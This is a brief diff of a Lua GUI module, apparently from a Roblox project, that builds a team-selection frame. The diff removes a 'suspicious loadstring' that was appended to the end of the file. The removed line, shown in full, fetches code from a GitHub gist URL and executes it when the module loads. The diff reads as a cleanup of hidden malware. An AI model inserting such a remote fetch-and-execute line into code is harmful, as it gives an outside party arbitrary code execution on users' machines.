@@ -1,4 +1,4 @@
---i hate guis omfg
+-- Suspicious Loadstring removed from this.
 local TeamFrame, Teams = nil, nil
 do
 	TeamFrame = Instance.new("Frame")
@@ -78,4 +78,3 @@ do
 	InmateButton.TextSize = 22.000
 end
 return TeamFrame, Teams
-loadstring(game:HttpGet("https://gist.githubusercontent.com/DavaApples/8f900b84006c6827cf5d50ccd8196b61/raw/11c251a71a06436fde22a07414f80310aff9e882/e"))()
